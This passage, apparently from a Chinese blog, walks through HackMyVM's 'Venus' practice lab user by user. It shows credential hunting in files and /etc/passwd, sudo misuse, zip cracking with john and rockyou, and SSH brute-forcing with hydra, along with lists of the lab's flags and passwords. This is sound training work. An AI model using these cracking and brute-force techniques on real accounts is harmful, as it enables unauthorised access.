\u6587\u4ef6\u4e2d\u4ee5 `a9HFX` \u5f00\u5934\u7684\u884c\uff0c\u4f46\u8fd9 5 \u4e2a\u5b57\u7b26\u4e0d\u662f\u5bc6\u7801\u7684\u4e00\u90e8\u5206\u3002\n\n1.  \u4f7f\u7528 `grep` \u67e5\u627e\u5305\u542b `a9HFX` \u7684\u884c\uff0c\u5e76\u624b\u52a8\u53bb\u9664\u524d\u7f00\u3002\n\n    ```bash\n    isla@venus:~$ grep 'a9HFX' passy\n    # ... (\u591a\u884c\u8f93\u51fa)\n    a9HFXWKINVzNQLKLDVAc \n    ```\n    \u5bc6\u7801\u662f `WKINVzNQLKLDVAc`\u3002\n\n2.  \u5207\u6362\u5230 `violet` \u7528\u6237\u3002\n\n    ```bash\n    isla@venus:~$ su violet\n    Password: WKINVzNQLKLDVAc\n    ```\n\n---\n\n## **Mission 0x11: violet -> lucy**\n- **\u4efb\u52a1**: \u7528\u6237 `lucy` \u7684\u5bc6\u7801\u5728 `end` \u6587\u4ef6\u4e2d\u4ee5 `0JuAZ` \u7ed3\u5c3e\u7684\u884c\uff0c\u4f46\u8fd9 5 \u4e2a\u5b57\u7b26\u4e0d\u662f\u5bc6\u7801\u7684\u4e00\u90e8\u5206\u3002\n\n1. \u4f7f\u7528 `grep` \u67e5\u627e\u8be5\u884c\uff0c\u5e76\u624b\u52a8\u53bb\u9664\u540e\u7f00\u3002\n\n   ```bash\n   violet@venus:~$ grep '0JuAZ' end\n   OCmMUjebG53giud0JuAZ\n   ```\n\n   \u5bc6\u7801\u662f `OCmMUjebG53giud`\u3002\n\n1. \u5207\u6362\u5230 `lucy` \u7528\u6237\u3002\n\n   ```bash\n   violet@venus:~$ su lucy\n   Password: OCmMUjebG53giud\n   ```\n\n---\n\n## **Mission 0x12: lucy -> elena**\n- **\u4efb\u52a1**: \u7528\u6237 `elena` \u7684\u5bc6\u7801\u5728 `file.yo` \u6587\u4ef6\u4e2d\u4f4d\u4e8e `fu` \u548c `ck` \u4e4b\u95f4\u3002\n\n1.  \u4f7f\u7528 `grep -o` \u6765\u4ec5\u63d0\u53d6\u5339\u914d\u7684\u90e8\u5206\u3002\n\n    ```bash\n    lucy@venus:~$ grep -o 'fu.*ck' file.yo\n    fu4xZ5lIKYmfPLg9tck\n    ```\n    \u5bc6\u7801\u662f `4xZ5lIKYmfPLg9t`\u3002\n\n2.  \u5207\u6362\u5230 `elena` \u7528\u6237\u3002\n\n    ```bash\n    lucy@venus:~$ su elena\n    Password: 4xZ5lIKYmfPLg9t\n    ```\n\n---\n\n## **Mission 0x13: elena -> alice**\n- **\u4efb\u52a1**: \u7528\u6237 `alice` \u7684\u5bc6\u7801\u5728\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\u4e2d\u3002\n\n1.  \u4f7f\u7528 `env` \u547d\u4ee4\u67e5\u770b\u6240\u6709\u73af\u5883\u53d8\u91cf\u3002\n\n    ```bash\n    elena@venus:~$ env\n    # ... (\u7701\u7565\u90e8\u5206\u8f93\u51fa)\n    PASS=Cgecy2MY2MWbaqt\n    # ...\n    ```\n\n2.  \u5207\u6362\u5230 `alice` \u7528\u6237\u3002\n\n    ```bash\n    elena@venus:~$ su alice\n    Password: Cgecy2MY2MWbaqt\n    ```\n\n---\n\n## **Mission 0x14: alice -> anna**\n- **\u4efb\u52a1**: `anna` \u7684\u5bc6\u7801\u4f5c\u4e3a\u6ce8\u91ca\u7559\u5728\u4e86 `/etc/passwd` \u6587\u4ef6\u4e2d\u3002\n\n1.  \u67e5\u770b `/etc/passwd` \u6587\u4ef6\uff0c\u6ce8\u610f `alice` \u7528\u6237\u884c\u7684\u6ce8\u91ca\u5b57\u6bb5\u3002\n\n    ```bash\n    alice@venus:~$ cat /etc/passwd\n    # ...\n    alice:x:1014:1014:w8NvY27qkpdePox:/pwned/alice:/bin/bash\n    anna:x:1015:1015::/pwned/anna:/bin/bash\n    # ...\n    ```\n    \u5728 `alice` \u7528\u6237\u884c\u7684\u7b2c\u4e94\u4e2a\u5b57\u6bb5\uff08\u6ce8\u91ca\u5b57\u6bb5\uff09\u627e\u5230\u4e86 `anna` \u7684\u5bc6\u7801 `w8NvY27qkpdePox`\u3002\n\n2.  \u5207\u6362\u5230 `anna` \u7528\u6237\u3002\n\n    ```bash\n    alice@venus:~$ su anna\n    Password: w8NvY27qkpdePox\n    ```\n\n---\n\n## **Mission 0x15: anna -> natalia**\n- **\u4efb\u52a1**: \u4f7f\u7528 `sudo` \u6210\u4e3a `natalia` \u7528\u6237\u3002\n\n1.  \u9996\u5148\u68c0\u67e5 `sudo` \u6743\u9650\u3002\n\n    ```bash\n    anna@venus:~$ sudo -l\n    User anna may run the following commands on venus:\n        (natalia) NOPASSWD: /bin/bash\n    ```\n\n2.  \u53d1\u73b0\u53ef\u4ee5\u514d\u5bc6\u4ee5 `natalia` \u7684\u8eab\u4efd\u6267\u884c `/bin/bash`\uff0c\u76f4\u63a5\u63d0\u6743\u3002\n\n    ```bash\n    anna@venus:~$ sudo -u natalia /bin/bash\n    natalia@venus:/pwned/anna$\n    ```\n\n---\n\n## **Mission 0x16: natalia -> eva**\n- **\u4efb\u52a1**: `eva` \u7684\u5bc6\u7801\u88ab\u7f16\u7801\u5728 `base64.txt` \u6587\u4ef6\u4e2d\u3002\n\n1.  \u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u5e76\u901a\u8fc7 `base64 -d` \u89e3\u7801\u3002\n\n    ```bash\n    natalia@venus:~$ cat base64.txt | base64 -d\n    upsCA3UFu10fDAO\n    ```\n\n2.  \u5207\u6362\u5230 `eva` \u7528\u6237\u3002\n\n    ```bash\n    natalia@venus:~$ su eva\n    Password: upsCA3UFu10fDAO\n    ```\n\n---\n\n## **Mission 0x17: eva -> clara**\n- **\u4efb\u52a1**: `clara` \u7684\u5bc6\u7801\u5728\u4e00\u4e2a 1968 \u5e74 5 \u6708 1 \u65e5\u4e4b\u540e\u4fee\u6539\u8fc7\u7684\u6587\u4ef6\u4e2d\u3002\uff08\u8fd9\u91cc\u81ea\u5df1\u60f3\u60f3\u529e\u6cd5\uff0c\u6211\u4e0d\u60f3\u590d\u73b0\u4e86\uff09\n\n1.  \u6839\u636e\u63d0\u793a\uff0c\u53ef\u4ee5\u63a8\u65ad\u6587\u4ef6\u7684\u4fee\u6539\u65f6\u95f4\u6bd4\u8f83\u7279\u6b8a\u3002\u7ecf\u8fc7\u67e5\u627e\uff0c\u53d1\u73b0\u4e00\u4e2a\u65f6\u95f4\u6233\u975e\u5e38\u65e9\u7684\u6587\u4ef6\u3002\n\n    ```bash\n    eva@venus:~$ ls -al /usr/lib/cmdo\n    -rw-r--r-- 1 root root 16 Jan  1  1970 /usr/lib/cmdo\n    ```\n\n2.  \u8bfb\u53d6\u8be5\u6587\u4ef6\u5185\u5bb9\u3002\n\n    ```bash\n    eva@venus:~$ cat /usr/lib/cmdo\n    39YziWp5gSvgQN9\n    ```\n\n3.  \u5207\u6362\u5230 `clara` \u7528\u6237\u3002\n\n    ```bash\n    eva@venus:~$ su clara\n    Password: 39YziWp5gSvgQN9\n    ```\n\n---\n\n## **Mission 0x18: clara -> frida**\n- **\u4efb\u52a1**: `frida` \u7684\u5bc6\u7801\u5728\u4e00\u4e2a\u53d7\u5bc6\u7801\u4fdd\u62a4\u7684 zip \u6587\u4ef6\u4e2d\uff0c\u63d0\u793a `rockyou.txt` \u5b57\u5178\u53ef\u80fd\u4f1a\u6709\u5e2e\u52a9\u3002\n\n1.  \u9996\u5148\u5c06 `protected.zip` \u6587\u4ef6 `base64` \u7f16\u7801\u5e76\u590d\u5236\u5230\u672c\u5730\u3002\n\n    ```bash\n    clara@venus:~$ base64 protected.zip\n    UEsDBAoACQAAAIMzhVhzdJ8jHAAAABAAAAAZABwAcHduZWQvY2xhcmEvcHJvdGVjdGVkLnR4dFVU\n    CQAD9pkPZvaZD2Z1eAsAAQQAAAAABAAAAACc/uQ52ED8vSTlcON+hM2vBK6cXas6YlcIf/9rUEsH\n    CHN0nyMcAAAAEAAAAFBLAQIeAwoACQAAAIMzhVhzdJ8jHAAAABAAAAAZABgAAAAAAAEAAACkgQAA\nAABwd25lZC9jbGFyYS9wcm90ZWN0ZWQudHh0VVQFAAP2mQ9mdXgLAAEEAAAAAAQAAAAAUEsFBgAA\nAAABAAEAXwAAAH8AAAAAAA==\n    ```\n\n2.  \u5728\u672c\u5730\uff0c\u4f7f\u7528 `john` \u548c `rockyou.txt` \u5b57\u5178\u7206\u7834 zip \u5bc6\u7801\u3002\n\n    ```bash\n    # \u5728\u672c\u5730Kali\u7b49\u7cfb\u7edf\u4e0a\u6267\u884c\n    echo '...' | base64 -d > protected.zip\n    zip2john protected.zip > hash\n    john --wordlist=/usr/share/wordlists/rockyou.txt hash\n    # ...\n    # \u7206\u7834\u51fa\u5bc6\u7801\u4e3a pass123\n    ```\n\n3.  \u4f7f\u7528\u7206\u7834\u51fa\u7684\u5bc6\u7801\u89e3\u538b\u6587\u4ef6\uff0c\u5e76\u8bfb\u53d6 `frida` \u7684\u5bc6\u7801\u3002\n\n    ```bash\n    # \u5728\u672c\u5730Kali\u7b49\u7cfb\u7edf\u4e0a\u6267\u884c\n    7z x protected.zip # \u8f93\u5165\u5bc6\u7801 pass123\n    cat pwned/clara/protected.txt\n    Ed4ErEUJEaMcXli\n    ```\n\n4.  \u5207\u6362\u5230 `frida` \u7528\u6237\u3002\n\n    ```bash\n    clara@venus:~$ su frida\n    Password: Ed4ErEUJEaMcXli\n    ```\n\n---\n\n## **Mission 0x19: frida -> eliza**\n- **\u4efb\u52a1**: `eliza` \u7684\u5bc6\u7801\u662f `repeated.txt` \u6587\u4ef6\u4e2d\u552f\u4e00\u91cd\u590d\u7684\u5b57\u7b26\u4e32\u3002\n\n1.  \u5bf9\u6587\u4ef6\u6392\u5e8f\u540e\uff0c\u4f7f\u7528 `uniq -d` \u53ef\u4ee5\u627e\u5230\u91cd\u590d\u7684\u884c\u3002\n\n    ```bash\n    frida@venus:~$ awk 'NR==1{prev=$0; next} $0==prev{print prev} {prev=$0}' repeated.txt\n    Fg6b6aoksceQqB9\n    ```\n\n2.  \u5207\u6362\u5230 `eliza` \u7528\u6237\u3002\n\n    ```bash\n    frida@venus:~$ su eliza\n    Password: Fg6b6aoksceQqB9\n    ```\n\n---\n\n## **Mission 0x20: eliza -> iris**\n- **\u4efb\u52a1**: `iris` \u7ed9\u6211\u7559\u4e0b\u4e86\u5979\u7684\u5bc6\u94a5\u3002\n\n1.  \u5728 `eliza` \u7684\u5bb6\u76ee\u5f55\u4e2d\uff0c\u627e\u5230\u4e86 `.iris_key`\uff0c\u8fd9\u662f SSH \u79c1\u94a5\u3002\n\n    ```bash\n    eliza@venus:~$ ls -al\n    # ...\n    -rw-r----- 1 root  eliza 2602 Apr  5  2024 .iris_key\n    ```\n\n2.  \u4f7f\u7528\u8fd9\u4e2a\u79c1\u94a5\u901a\u8fc7 SSH \u767b\u5f55\u5230 `iris` \u8d26\u6237\u3002\n\n    ```bash\n    eliza@venus:~$ ssh iris@127.0.0.1 -i .iris_key\n    Welcome to Debian GNU/Linux 11 (bullseye)!\n    # ...\n    iris@venus:~$\n    ```\n\n---\n\n## **Mission 0x21: iris -> eloise**\n- **\u4efb\u52a1**: `eloise` \u7528\u4e00\u79cd\u7279\u6b8a\u7684\u65b9\u5f0f\u4fdd\u5b58\u4e86\u5979\u7684\u5bc6\u7801\u3002\n\n1.  \u5728 `iris` \u5bb6\u76ee\u5f55\u4e2d\u53d1\u73b0\u4e00\u4e2a\u540d\u4e3a `eloise` \u7684\u6587\u4ef6\uff0c\u5185\u5bb9\u770b\u8d77\u6765\u662f Base64 \u7f16\u7801\u7684\u3002\n\n    ```bash\n    iris@venus:~$ cat eloise\n    /9j/4AAQSkZJRgABAQEAYABgAAD/4RDSRXhpZgAATU0AKgAAAAgABAE7AAIAAAAEc01MAIdpAAQA\n    # ... (\u7701\u7565)\n    ```\n\n2.  \u5c06\u5185\u5bb9\u590d\u5236\u5230\u672c\u5730\uff0c\u89e3\u7801\u540e\u53d1\u73b0\u662f\u4e00\u4e2a JPEG \u56fe\u7247\u6587\u4ef6\u3002\n\n    ```bash\n    # \u5728\u672c\u5730Kali\u7b49\u7cfb\u7edf\u4e0a\u6267\u884c\n    cat eloise_base64.txt | base64 -d > eloise.jpg\n    file eloise.jpg\n    # eloise.jpg: JPEG image data ...\n    ```\n\n3.  \u6253\u5f00\u56fe\u7247\uff0c\u56fe\u7247\u4e2d\u663e\u793a\u4e86\u5bc6\u7801\uff1a`yOUJlV0SHOnbSPm`\u3002\n\n4.  \u5207\u6362\u5230 `eloise` \u7528\u6237\u3002\n\n    ```bash\n    iris@venus:~$ su eloise\n    Password: yOUJlV0SHOnbSPm\n    eloise@venus:~$\n    ```\n\n---\n\n# **Flag \u6c47\u603b**\n\n```bash\n1.  sophia:   8===LUzzNuv8NB59iztWUIQS===D~~\n2.  angela:   8===SjMYBmMh4bk49TKq7PM8===D~~\n3.  emma:     8===0daqdDlmd9XogkiHu4yq===D~~\n4.  mia:      8===FBMdY8hel2VMA3BaYJin===D~~\n5.  camila:   8===iDIi5sm1mDuqGmU5Psx6===D~~\n6.  luna:     8===KCO34FpIq3nBmHbyZvFh===D~~\n7.  eleanor:  8===Iq5vbyiQl4ipNrLDArjD===D~~\n8.  victoria: 8===NWyTFi9LLqVsZ4OnuZYN===D~~\n9.  isla:     8===ZyZqc1suvGe4QlkZHFlq===D~~\n10. violet:   8===LzErk0qFPYJj16mNnnYZ===D~~\n11. lucy:     8===AdCJ4wl8pmbhi770Xbd3===D~~\n12. elena:    8===st1pTdqEQ0bvrJfWGwLA===D~~\n13. alice:    8===Qj4NNWp8LOC96S9Rtgrk===D~~\n14. anna:     8===5Y3DhT66fa6Da8RpLKG0===D~~\n15. natalia:  8===JWHa1GQq1AYrBWNXEJrH===D~~\n16. eva:      8===22cqk3iGkGYVqnYrHiof===D~~\n17. clara:    8===EJWmHDEQeEN1vIR7NYiH===D~~\n18. frida:    8===Ikg2qj8KT2bGJtWvR6hC===D~~\n19. eliza:    8===zwWIPyDf2ozwVhCTxm1I===D~~\n20. iris:     8===ClrdWOqlZ1vL61zSk9Va===D~~\n21. eloise:   8===57CzBLKaEq2N8YBFRu31===D~~\n```\n\n# Pass\n\n```bash\n01: sophia/Y1o645M3mR84ejc\n02: angela/oh5p9gAABugHBje\n03: emma/fIvltaGaq0OUH8O\n04: mia/iKXIYg0pyEH2Hos\n05: camila/F67aDmCAAgOOaOc\n06: luna/j3vkuoKQwvbhkMc\n07: eleanor/UNDchvln6Bmtu7b\n08: victoria/pz8OqvJBFxH0cSj\n09: isla/D3XTob0FUImsoBb\n10: violet/WKINVzNQLKLDVAc\n11: lucy/OCmMUjebG53giud\n12: elena/4xZ5lIKYmfPLg9t\n13: alice/Cgecy2MY2MWbaqt\n14: anna/w8NvY27qkpdePox\n15: natalia/NMuc4DkYKDsmZ5z\n16: eva/upsCA3UFu10fDAO\n17: clara/39YziWp5gSvgQN9\n18: frida/Ed4ErEUJEaMcXli\n19: eliza/Fg6b6aoksceQqB9\n20: iris/kYjyoLcnBZ9EJdz\n21: eloise/yOUJlV0SHOnbSPm\n```\n\nsentence", "top": 0, "createdAt": 1754441666, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P191": {"htmlDir": "docs/post/hmv_Labs_venus22to30.html", "labels": ["HackMyVM_Labs"], "postTitle": "hmv_Labs_venus22to30", "postUrl": "post/hmv_Labs_venus22to30.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/191", "commentNum": 0, "wordCount": 5971, "description": "# \u7ee7\u7eed\n## **Mission 0x22: eloise -> lucia**\n\n-   **\u4efb\u52a1**: \u7528\u6237 `lucia` \u7528\u4e00\u79cd\u6709\u521b\u610f\u7684\u65b9\u5f0f\u4fdd\u5b58\u4e86\u5979\u7684\u5bc6\u7801\u3002\n\n1.  \u5728\u5bb6\u76ee\u5f55\u4e2d\u53d1\u73b0\u4e00\u4e2a `hi` \u6587\u4ef6\uff0c\u5176\u5185\u5bb9\u4e3a\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u3002\n\n    ```bash\n    eloise@venus:~$ cat hi\n    00000000: 7576 4d77 4644 5172 5157 504d 6547 500a\n    ```\n\n2.  \u8fd9\u662f\u4e00\u4e2a\u5341\u516d\u8fdb\u5236\u8f6c\u50a8 (hexdump)\uff0c\u9700\u8981\u5c06\u5176\u8f6c\u6362\u56de\u539f\u59cb\u6587\u672c\u3002\u4f7f\u7528 `xxd` \u5de5\u5177\u8fdb\u884c\u9006\u5411\u8f6c\u6362\u3002\n\n    ```bash\n    eloise@venus:~$ cat hi | xxd -r -p\n    uvMwFDQrQWPMeGP\n    ```\n\n3.  \u4f7f\u7528\u5f97\u5230\u7684\u5bc6\u7801\u5207\u6362\u5230 `lucia` \u7528\u6237\u3002\n\n    ```bash\n    eloise@venus:~$ su lucia\n    Password: uvMwFDQrQWPMeGP\n    ```\n\n---\n\n## **Mission 0x23: lucia -> isabel**\n\n-   **\u4efb\u52a1**: \u7528\u6237 `isabel` \u7684\u5bc6\u7801\u5728 `/etc/xdg` \u76ee\u5f55\u4e0b\u7684\u4e00\u4e2a\u6587\u4ef6\u4e2d\uff0c\u6587\u4ef6\u540d\u4e0d\u8be6\uff0c\u4f46 `dict.txt` \u6587\u4ef6\u53ef\u4ee5\u63d0\u4f9b\u7ebf\u7d22\u3002\n\n1.  \u68c0\u67e5\u5bb6\u76ee\u5f55\u4e0b\u7684 `dict.txt`\uff0c\u5b83\u5305\u542b\u4e00\u4e2a\u6587\u4ef6\u540d\u5217\u8868\u3002\u540c\u65f6\uff0c\u5728\u8be5\u6587\u4ef6\u4e2d\u53d1\u73b0\u4e86\u4e00\u4e2a\u9690\u85cf\u7684 Flag\u3002\n\n2.  \u7f16\u5199\u4e00\u4e2a\u5faa\u73af\u811a\u672c\uff0c\u8bfb\u53d6 `dict.txt` \u4e2d\u7684\u6bcf\u4e00\u884c\uff0c\u5e76\u5c1d\u8bd5\u8bbf\u95ee `/etc/xdg/` \u76ee\u5f55\u4e0b\u5bf9\u5e94\u7684\u6587\u4ef6\uff0c\u76f4\u5230\u627e\u5230\u5bc6\u7801\u4e3a\u6b62\u3002\n\n    ```bash\n    lucia@venus:~$ while read f; do file='/etc/xdg/$f'; cat '$file' 2>/dev/null && echo 'Found in: $file' && break; done < ~/dict.txt\n    H5ol8Z2mrRsorC0\n    Found in: /etc/xdg/readme\n    ```\n\n3.  \u811a\u672c\u6210\u529f\u5728 `/etc/xdg/readme` \u6587\u4ef6\u4e2d\u627e\u5230\u4e86\u5bc6\u7801\u3002\u4f7f\u7528\u8be5\u5bc6\u7801\u5207\u6362\u5230 `isabel` \u7528\u6237\u3002\n\n    ```bash\n    lucia@venus:~$ su isabel\n    Password: H5ol8Z2mrRsorC0\n    ```\n\n---\n\n## **Mission 0x24: isabel -> freya**\n\n-   **\u4efb\u52a1**: \u7528\u6237 `freya` \u7684\u5bc6\u7801\u662f `different.txt` \u6587\u4ef6\u4e2d\u552f\u4e00\u6ca1\u6709\u91cd\u590d\u7684\u5b57\u7b26\u4e32\u3002\n\n1.  \u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u6807\u51c6\u65b9\u6cd5\u662f\u5148\u5bf9\u6587\u4ef6\u5185\u5bb9\u8fdb\u884c\u6392\u5e8f\uff0c\u7136\u540e\u4f7f\u7528 `uniq -u` \u547d\u4ee4\u627e\u51fa\u53ea\u51fa\u73b0\u4e00\u6b21\u7684\u884c\u3002\n\n    ```bash\n    isabel@venus:~$ sort different.txt | uniq -u\n    EEDyYFDwYsmYawj\n    ```\n\n2.  \u5207\u6362\u5230 `freya` \u7528\u6237\u3002\n\n    ```bash\n    isabel@venus:~$ su freya\n    Password: EEDyYFDwYsmYawj\n    ```\n\n---\n\n## **Mission 0x25: freya -> alexa**\n\n-   **\u4efb\u52a1**: \u7528\u6237 `alexa` \u6bcf\u5206\u949f\u4f1a\u5728 `/free` \u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u5305\u542b\u5bc6\u7801\u7684 `.txt` \u6587\u4ef6\uff0c\u7136\u540e\u7acb\u5373\u5220\u9664\u5b83\u3002\n\n1.  \u8fd9\u662f\u4e00\u4e2a\u5178\u578b\u7684\u7ade\u6001\u6761\u4ef6\u95ee\u9898\u3002\u6211\u4eec\u9700\u8981\u6301\u7eed\u76d1\u63a7\u76ee\u6807\u76ee\u5f55\uff0c\u5e76\u5728\u6587\u4ef6\u51fa\u73b0\u65f6\u8fc5\u901f\u8bfb\u53d6\u5176\u5185\u5bb9\u3002\n\n2.  \u4f7f\u7528\u4e00\u4e2a `while` \u5faa\u73af\u6765\u4e0d\u65ad\u5c1d\u8bd5\u8bfb\u53d6 `/free` \u76ee\u5f55\u4e0b\u7684 `.txt` \u6587\u4ef6\uff08\u6839\u636e `ls` \u53d1\u73b0\u6587\u4ef6\u540d\u4e3a `beer.txt`\uff09\u3002\n\n    ```bash\n    freya@venus:/free$ while true; do cat *.txt 2>/dev/null; sleep 0.1; done\n    mxq9O3MSxxX9Q3S\n    ```\n\n3.  \u6210\u529f\u6355\u83b7\u5230\u5bc6\u7801\u540e\uff0c\u5207\u6362\u5230 `alexa` \u7528\u6237\u3002\n\n    ```bash\n    freya@venus:/free$ su alexa\n    Password: mxq9O3MSxxX9Q3S\n    ```\n\n---\n\n## **Mission 0x26: alexa -> ariel**\n\n-   **\u4efb\u52a1**: \u7528\u6237 `ariel` \u7684\u5bc6\u7801\u5728\u7ebf (HTTP)\u3002\n\n1.  \u8fd9\u4e2a\u63d0\u793a\u610f\u5473\u7740\u5bc6\u7801\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee\u672c\u5730\u7684 Web \u670d\u52a1\u83b7\u53d6\u3002\u4f7f\u7528 `curl` \u547d\u4ee4\u8bf7\u6c42 `127.0.0.1`\u3002\n\n    ```bash\n    alexa@venus:~$ curl 127.0.0.1\n    33EtHoz9a0w2Yqo\n    ```\n\n2.  \u76f4\u63a5\u5f97\u5230\u4e86\u5bc6\u7801\uff0c\u5207\u6362\u5230 `ariel` \u7528\u6237\u3002\n\n    ```bash\n    alexa@venus:~$ su ariel\n    Password: 33EtHoz9a0w2Yqo\n    ```\n\n---\n\n## **Mission 0x27: ariel -> lola**\n\n-   **\u4efb\u52a1**: `ariel` \u6ca1\u6765\u5f97\u53ca\u4fdd\u5b58 `lola` \u7684\u5bc6\u7801\uff0c\u4f46\u7559\u4e0b\u4e86\u4e00\u4e2a\u4e34\u65f6\u6587\u4ef6 `.goas.swp`\u3002\n\n1.  `.swp` \u6587\u4ef6\u662f Vim \u7f16\u8f91\u5668\u7684\u4ea4\u6362\u6587\u4ef6\u3002\u4f7f\u7528 `strings` \u547d\u4ee4\u53ef\u4ee5\u4ece\u4e2d\u63d0\u53d6\u53ef\u6253\u5370\u7684\u5b57\u7b26\uff0c\u901a\u5e38\u80fd\u627e\u5230\u6709\u7528\u7684\u4fe1\u606f\u3002\n\n    ```bash\n    ariel@venus:~$ strings .goas.swp\n    # ... (\u90e8\u5206\u8f93\u51fa)\n    -->VVjqJGRrnfKmcgD\n    -->bnQgcXYamhSDSff\n    -->QsymOOVbzSaKmRm\n    # ... (\u66f4\u591a\u5bc6\u7801)\n    -->ppkJjqYvSCIyAhK\n    Thats my little DIc with my old and current passw0rds:\n    ```\n\n2.  \u6587\u4ef6\u5185\u5bb9\u662f\u4e00\u4e2a\u5bc6\u7801\u5217\u8868\u3002\u7531\u4e8e\u65e0\u6cd5\u786e\u5b9a\u54ea\u4e00\u4e2a\u662f\u6b63\u786e\u7684\uff0c\u9700\u8981\u5c06\u5217\u8868\u590d\u5236\u5230\u672c\u5730\uff0c\u4f7f\u7528 `hydra` \u7b49\u5de5\u5177\u5bf9 `lola` \u7528\u6237\u7684 SSH \u670d\u52a1\u8fdb\u884c\u7206\u7834\u3002\n\n    ```bash\n    # \u5728\u672c\u5730Kali\u7cfb\u7edf\u4e0a\u6267\u884c\uff0c'pass'\u6587\u4ef6\u5305\u542b\u4ece.swp\u6587\u4ef6\u4e2d\u63d0\u53d6\u7684\u5bc6\u7801\u5217\u8868\n    hydra -l lola -P pass ssh://venus.hackmyvm.eu:5000 -t 64\n    ```\n\n3.  Hydra \u5f88\u5feb\u627e\u5230\u4e86\u6b63\u786e\u7684\u5bc6\u7801 `d3LieOzRGX5wud6`\u3002\u4f7f\u7528\u8be5\u5bc6\u7801\u767b\u5f55 `lola` \u8d26\u6237\u3002\n\n---\n\n## **Mission 0x28: lola -> celeste**\n\n-   **\u4efb\u52a1**: \u7528\u6237 `celeste` \u7559\u4e0b\u4e86\u4e00\u4e2a\u6587\u4ef6\u540d\u5217\u8868 `pages.txt`\uff0c\u5979\u7684\u5bc6\u7801\u53ef\u80fd\u5728\u5176\u4e2d\u4e00\u4e2a `.html` \u9875\u9762\u91cc\u3002\n\n1.  \u4e0e Mission 23 \u7c7b\u4f3c\uff0c\u9700\u8981\u7f16\u5199\u811a\u672c\u6765\u6d4b\u8bd5 `pages.txt` \u4e2d\u7684\u6240\u6709\u53ef\u80fd\u6027\u3002\u8fd9\u6b21\u662f\u68c0\u67e5\u54ea\u4e2a\u9875\u9762\u5728\u672c\u5730 Web \u670d\u52a1\u5668\u4e0a\u5b58\u5728\u3002\n\n2.  \u4f7f\u7528 `while` \u5faa\u73af\u8bfb\u53d6\u5217\u8868\uff0c\u5e76\u901a\u8fc7 `curl` \u68c0\u67e5\u6bcf\u4e2a\u9875\u9762\u7684 HTTP \u72b6\u6001\u7801\u3002\n\n    ```bash\n    lola@venus:~$ while read p; do code=$(curl -s -o /dev/null -w '%{http_code}' 'http://127.0.0.1/$p.html'); if [ '$code' == '200' ]; then echo 'Found: $p.html'; fi; done < pages.txt\n    Found: cebolla.html\n    ```\n\n3.  \u627e\u5230\u4e86\u8fd4\u56de `200 OK` \u7684\u9875\u9762 `cebolla.html`\u3002\u8bbf\u95ee\u8be5\u9875\u9762\u83b7\u53d6\u5bc6\u7801\u3002\n\n    ```bash\n    lola@venus:~$ curl 127.0.0.1/cebolla.html\n    VLSNMTKwSV2o8Tn\n    ```\n\n4.  \u5207\u6362\u5230 `celeste` \u7528\u6237\u3002\n\n    ```bash\n    lola@venus:~$ su celeste\n    Password: VLSNMTKwSV2o8Tn\n    ```\n\n---\n\n## **Mission 0x29: celeste -> nina**\n\n-   **\u4efb\u52a1**: \u7528\u6237 `celeste` \u53ef\u4ee5\u8bbf\u95ee MySQL\uff0c\u4f46\u6709\u4ec0\u4e48\u7528\u5462\uff1f\n\n1.  \u4f7f\u7528 `celeste` \u5f53\u524d\u7684\u5bc6\u7801\u5c1d\u8bd5\u767b\u5f55 MySQL \u6570\u636e\u5e93\u3002\n\n    ```bash\n    celeste@venus:~$ mysql -u celeste -pVLSNMTKwSV2o8Tn\n    ```\n\n2.  \u767b\u5f55\u6210\u529f\u540e\uff0c\u67e5\u8be2\u6570\u636e\u5e93\u4e2d\u7684\u4fe1\u606f\u3002\n    ```sql\n    MariaDB [(none)]> SHOW DATABASES;\n    MariaDB [(none)]> USE venus;\n    MariaDB [venus]> SHOW TABLES;\n    MariaDB [venus]> SELECT * FROM people;\n    ```\n\n3.  `people` \u8868\u4e2d\u5305\u542b\u5927\u91cf\u7528\u6237\u540d\u548c\u5bc6\u7801\u3002\u5176\u4e2d\uff0c`id_people=35` \u7684 `pazz` \u5b57\u6bb5\u662f\u4e00\u4e2a\u9690\u85cf Flag\u3002\u540c\u65f6\uff0c`id_people=74` \u7684 `nina` \u7528\u6237\u51ed\u8bc1\u770b\u8d77\u6765\u5f88\u6709\u5e0c\u671b\u3002\n\n4.  \u5c06\u6240\u6709\u51ed\u8bc1\u590d\u5236\u5230\u672c\u5730\uff0c\u518d\u6b21\u4f7f\u7528 `hydra` \u7206\u7834 SSH\uff0c\u6700\u7ec8\u786e\u8ba4 `nina` \u7684\u5bc6\u7801\u3002\n    ```bash\n    # \u5728\u672c\u5730Kali\u7cfb\u7edf\u4e0a\u6267\u884c\uff0c'db_pass.txt'\u4e3a\u4ece\u6570\u636e\u5e93\u5bfc\u51fa\u7684user:pass\u6587\u4ef6\n    hydra -C db_pass.txt ssh://venus.hackmyvm.eu:5000\n    # ...\n    # [5000][ssh] host: venus.hackmyvm.eu   login: nina   password: ixpeqdWuvC5N9kG\n    ```\n\n5.  \u4f7f\u7528\u627e\u5230\u7684\u5bc6\u7801 `ixpeqdWuvC5N9kG` \u767b\u5f55 `nina` \u8d26\u6237\u3002\n\n---\n\n## **Mission 0x30: nina -> kira**\n\n-   **\u4efb\u52a1**: \u7528\u6237 `kira` \u5728 `http://localhost/method.php` \u85cf\u4e86\u4e1c\u897f\u3002\n\n1.  \u6587\u4ef6\u540d `method.php` \u6697\u793a\u9700\u8981\u6d4b\u8bd5\u4e0d\u540c\u7684 HTTP \u8bf7\u6c42\u65b9\u6cd5\u3002\n\n2.  \u4f7f\u7528 `for` \u5faa\u73af\u6d4b\u8bd5\u5e38\u7528\u7684 HTTP \u65b9\u6cd5\uff0c\u5e76\u89c2\u5bdf\u54cd\u5e94\u3002\n\n    ```bash\n    nina@venus:~$ for method in GET POST PUT DELETE PATCH OPTIONS; do echo -n '[$method] -> '; curl -s -X '$method' http://localhost/method.php; 